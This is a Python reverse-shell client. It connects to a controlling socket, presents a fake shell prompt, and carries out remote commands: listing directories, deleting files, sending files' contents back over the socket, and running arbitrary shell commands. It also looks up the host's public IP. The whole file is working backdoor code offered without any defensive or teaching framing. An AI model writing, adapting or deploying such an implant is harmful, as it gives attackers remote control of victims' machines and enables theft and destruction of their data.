import socket
import os
import subprocess
import urllib.request


def pwd():
    return os.getcwd()


def whoami():
    return os.getlogin()


def ls():
    return os.listdir()


def cd(new_directory):
    os.chdir(new_directory)


def shred(item_path):
    if os.path.isdir(item_path):
        os.rmdir(item_path)
    else:
        os.remove(item_path)


def send(connection_socket, file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
        connection_socket.sendall(data)


def command(cmd):
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def publish():
    """Get IP address to create connection."""
    r = urllib.request.urlopen('https://api.ipify.org')
    ip_address = r.read().decode()
    print(ip_address)


def main():
    publish()

    conn = socket.socket()
    conn.connect(('127.0.0.1', 9999))

    while True:
        cwd = pwd()
        conn.sendall(f"\n{cwd}:~$$$ ".encode())
        cmd = conn.recv(4096).decode()

        if 'pwd' in cmd.lower():
            conn.sendall(pwd().encode())
            continue

        elif 'whoami' in cmd.lower():
            conn.sendall(whoami().encode())
            continue

        elif 'ls' in cmd.lower():
            try:
                for item in ls():
                    conn.sendall(f"{item}\n".encode())
                continue
            except Exception as e:
                conn.sendall(f"Could not list directory: {e}\n".encode())
                continue

        elif 'cd' in cmd.lower():
            split_command = cmd.split()
            new_directory = ' '.join(split_command[1:])
            try:
                cd(new_directory)
                continue
            except Exception as e:
                conn.sendall(f"Could not change directory: {e}\n".encode())
                continue

        elif 'shred' in cmd.lower():
            split_command = cmd.split()
            item = split_command[1]
            try:
                if os.path.isdir(item):
                    os.rmdir(item)
                else:
                    os.remove(item)
                continue
            except Exception as e:
                conn.sendall(f"Could not remove item: {e}".encode())

        elif 'send' in cmd.lower():
            split_command = cmd.split()
            try:
                send(conn, split_command[1])
                continue
            except Exception as e:
                conn.sendall(f"Could not send file: {e}".encode())
                continue

        elif 'command' in cmd.lower():
            split_command = cmd.split()
            process = command(split_command[1])
            if process.stdout:
                conn.sendall(process.stdout)
                continue
            else:
                conn.sendall(process.stderr)
                continue

        elif 'exitnow' in cmd.lower():
            conn.sendall(b">>>>> Closing connection.\n")
            conn.close()
            break
    
main()